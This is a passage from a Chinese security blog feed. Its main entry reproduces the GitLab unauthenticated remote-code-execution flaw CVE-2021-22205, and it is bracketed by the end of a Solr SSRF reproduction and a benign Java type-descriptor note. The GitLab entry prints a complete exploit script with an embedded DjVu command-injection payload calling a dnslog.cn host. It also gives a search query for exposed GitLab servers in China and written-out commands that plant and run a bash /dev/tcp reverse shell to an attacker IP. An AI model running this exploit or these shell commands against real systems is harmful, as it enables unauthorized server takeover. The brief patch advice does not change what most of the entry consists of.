<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">27905</span>.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span> -d otettj.dnslog.cn</span><br></pre></td></tr></table></figure>

<p>提示目标系统可能存在SSRF漏洞</p>
<p>![image-20211115213537111](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213537111.png)</p>
<p>我们查看DNslog平台,有DNS解析记录。</p>
<p>![image-20211115213646434](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213646434.png)</p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议受影响的用户升级到最新版本8.8.2</p>
<p>Apache Solr 8.8.2官方下载地址</p>
<p><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web容器漏洞</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>-web漏洞 -Apache漏洞 -组件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitlab未授权命令执行漏洞复现(CVE-2021-22205)</title>
    <url>/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/</url>
    <content><![CDATA[<h1 id="Gitlab未授权命令执行漏洞复现-CVE-2021-22205"><a href="#Gitlab未授权命令执行漏洞复现-CVE-2021-22205" class="headerlink" title="Gitlab未授权命令执行漏洞复现(CVE-2021-22205)"></a>Gitlab未授权命令执行漏洞复现(CVE-2021-22205)</h1><hr>
<p>GitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 Web服务</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p>2021年10月28日，GitLab远程命令执行漏洞（CVE-2021-22205）在野利用工具被公开，这意味着黑客可直接利用该攻击代码实施入侵攻击。具体而言，GitLab某些端点的路径存在无需授权风险，攻击者可在无需认证的情况下完成图片上传，并利用该漏洞构造恶意数据执行远程命令，最终造成服务器敏感信息泄露或执行任意命令。该漏洞CVSS3.0评分9.9分，定级为严重漏洞。</p>
<h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><hr>
<p>11.9 &lt;&#x3D; Gitlab &lt;&#x3D; 13.8.7<br>13.9 &lt;&#x3D; Gitlab &lt;&#x3D; 13.9.5<br>13.10 &lt;&#x3D; Gitlab &lt;&#x3D; 13.10.2</p>
<p>P.S. 本文复现版本：<br>Gitlab CE 13.10.2</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr>
<p>使用docker拉取项目资源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull gitlab/gitlab-ce:13.10.2-ce.0</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211116172551874.png" class title="image-20211116172551874">



<p>启动Gitlab漏洞环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 9980:80 -p 9922:22  -v /usr/local/gitlab-test/etc:/etc/gitlab -v /usr/local/gitlab-test/log:/var/log/gitlab -v /usr/local/gitlab-test/opt:/var/opt/gitlab--restart always --privileged=true --name gitlab-test gitlab/gitlab-ce:13.10.2-ce.0</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211116173041136.png" class title="image-20211116173041136">



<p>使用Docker ps查看正在运行进程</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117194141133.png" class title="image-20211117194141133">



<p>在浏览器上访问9980端口，可以看到访问Gitlab服务器成功</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211116173609502.png" class title="image-20211116173609502">



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><hr>
<p>搜索引擎查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Title=&quot;GitLab&quot; &amp;&amp; country=&quot;CN&quot;</span><br></pre></td></tr></table></figure>



<p>漏洞POC&#x2F;EXP:</p>
<p>转自:<a href="https://github.com/Al1ex/CVE-2021-22205">Al1ex&#x2F;CVE-2021-22205: CVE-2021-22205&amp; GitLab CE&#x2F;EE RCE (github.com)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	  ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____  </span></span><br><span class="line"><span class="string">	 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___| </span></span><br><span class="line"><span class="string">	| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \ </span></span><br><span class="line"><span class="string">	| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |</span></span><br><span class="line"><span class="string"> 	\____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 	                                Author:Al1ex@Heptagram</span></span><br><span class="line"><span class="string">                                Github:https://github.com/Al1ex                             </span></span><br><span class="line"><span class="string">    	&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        验证模式：python CVE-2021-22205.py -v true -t target_url </span></span><br><span class="line"><span class="string">        攻击模式：python CVE-2021-22205.py -a true -t target_url -c command </span></span><br><span class="line"><span class="string">        批量检测：python CVE-2021-22205.py -s true -f file </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">target_url</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = session.get(target_url.strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/users/sign_in&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        soup = BeautifulSoup(req1.text, features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">        token = soup.findAll(<span class="string">&#x27;meta&#x27;</span>)[<span class="number">16</span>].get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">        data = <span class="string">&quot;\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\&quot;?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \&quot;\\\n\&quot; . qx&#123;curl `whoami`.82sm53.dnslog.cn&#125; . \\\n\&quot; b \&quot;) )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;X-CSRF-Token&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;token&#125;</span>&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>&#125;</span><br><span class="line">        flag = <span class="string">&#x27;Failed to process image&#x27;</span></span><br><span class="line">        req2 = session.post(target_url.strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/uploads/user&quot;</span>, data=data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> req2.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 目标 &#123;&#125; 存在漏洞&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 目标 &#123;&#125; 不存在漏洞&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">target_url,command</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = session.get(target_url.strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/users/sign_in&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        soup = BeautifulSoup(req1.text, features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">        token = soup.findAll(<span class="string">&#x27;meta&#x27;</span>)[<span class="number">16</span>].get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">        data = <span class="string">&quot;\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\&quot;?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \&quot;\\\n\&quot; . qx&#123;&quot;</span>+  command +<span class="string">&quot;&#125; . \\\n\&quot; b \&quot;) )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;X-CSRF-Token&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;token&#125;</span>&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>&#125;</span><br><span class="line">        flag = <span class="string">&#x27;Failed to process image&#x27;</span></span><br><span class="line">        req2 = session.post(target_url.strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/uploads/user&quot;</span>, data=data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> req2.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 目标 &#123;&#125; 存在漏洞&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 请到dnslog或主机检查执行结果&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 目标 &#123;&#125; 不存在漏洞&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">file</span>):</span></span><br><span class="line">    <span class="keyword">for</span> url_link <span class="keyword">in</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> url_link.strip() != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                url_path = format_url(url_link.strip())</span><br><span class="line">                check(url_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">&quot;http&quot;</span>:</span><br><span class="line">            url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">            url = url.strip()</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;URL 错误 &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(url))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;GitLab &lt; 13.10.3 RCE&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--verify&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>,<span class="built_in">help</span>=<span class="string">&#x27; 验证模式 &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27; 目标URL &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--attack&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>, <span class="built_in">help</span>=<span class="string">&#x27; 攻击模式 &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27; 执行命令 &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--scan&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>, <span class="built_in">help</span>=<span class="string">&#x27; 批量模式 &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27; 文件路径 &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    verify_model = args.verify</span><br><span class="line">    target_url   = args.target</span><br><span class="line"></span><br><span class="line">    attack_model = args.attack</span><br><span class="line">    command = args.command</span><br><span class="line"></span><br><span class="line">    scan_model = args.scan</span><br><span class="line">    file = args.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> verify_model <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> target_url !=<span class="literal">None</span>:</span><br><span class="line">        check(target_url)</span><br><span class="line">    <span class="keyword">elif</span> attack_model <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> target_url != <span class="literal">None</span> <span class="keyword">and</span> command != <span class="literal">None</span>:</span><br><span class="line">        attack(target_url,command)</span><br><span class="line">    <span class="keyword">elif</span> scan_model <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> file != <span class="literal">None</span>:</span><br><span class="line">        scan(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sys.exit(<span class="number">0</span>)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>运行页面如下:</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117190708830.png" class title="image-20211117190708830">



<p>选项:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">验证模式：python CVE-2021-22205.py -v true -t target_url</span><br><span class="line">攻击模式：python CVE-2021-22205.py -a true -t target_url -c command</span><br><span class="line">批量检测：python CVE-2021-22205.py -s true -f file</span><br></pre></td></tr></table></figure>



<p>对搭建环境进行漏洞检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -v true -t http://192.168.211.129:9980</span><br></pre></td></tr></table></figure>

<p>可以看到该Gitlab存在漏洞</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117194704856.png" class title="image-20211117194704856">



<h3 id="Dnslog"><a href="#Dnslog" class="headerlink" title="Dnslog"></a>Dnslog</h3><p>下面对该漏洞进行利用，这里使用Dnslog解析来验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -a true -t http://192.168.211.129:9980 -c &quot;curl qnfjxb.dnslog.cn&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117195844747.png" class title="image-20211117195844747">



<p>可以看到在Dnslog平台上看到请求的解析记录，验证漏洞成功</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117195659211.png" class title="image-20211117195659211">



<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-2205.py -a true -t http://Your IP:port -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27; &gt; /tmp/1.sh&quot;</span><br><span class="line">//这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下</span><br><span class="line"></span><br><span class="line">python3 CVE-2021-2205.py -a true -t http://Your IP:port -c &quot;chmod +x /tmp/1.sh&quot;</span><br><span class="line">//这条语句意思是代表，对写入成功的sh脚本加执行权限</span><br><span class="line"></span><br><span class="line">python3 CVE-2021-2205.py -a true -t http://Your IP:port -c &quot;/bin/bash /tmp/1.sh&quot;</span><br><span class="line">//这句话的意思是执行该脚本</span><br></pre></td></tr></table></figure>



<p>首先将反弹shell命令写入到系统文件中，如下图:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -a true -t http://192.168.211.129:9980 -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.233.1/12345 0&gt;&amp;1&#x27; &gt; /tmp/shell.sh&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117200315406.png" class title="image-20211117200315406">



<p>可以看到shell.sh写入服务器成功</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117200622194.png" class title="image-20211117200622194">



<p>然后再个写入的脚本赋予执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -a true -t http://192.168.211.129:9980 -c &quot;chmod +x /tmp/shell.sh&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117200912543.png" class title="image-20211117200912543">



<p>可以看到shell.sh有了执行权限</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117200901243.png" class title="image-20211117200901243">



<p>最后就是运行该脚本反弹shell,首先使用netcat监听本地12345端口，等待连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117201549545.png" class title="image-20211117201549545">



<p>运行shell.sh脚本反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-22205-exp.py -a true -t http://192.168.211.129:9980 -c &quot;/bin/bash /tmp/shell.sh&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117201646293.png" class title="image-20211117201646293">



<p>反弹shell成功</p>
<img src="/2021/11/15/Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-22205)/image-20211117201527660.png" class title="image-20211117201527660">





<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1、及时升级GitLab至最新安全版本</p>
<p>2、配置访问控制策略，避免受影响的GitLab暴露在公网</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Gitlab</category>
      </categories>
      <tags>
        <tag>-web漏洞 - Gitlab -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA类型描述符</title>
    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
<p>其中有这么一段记录,如下:</p>
<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">

<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
<p>于是我写了个简单的打印字符串数组Demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果为:</p>
<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

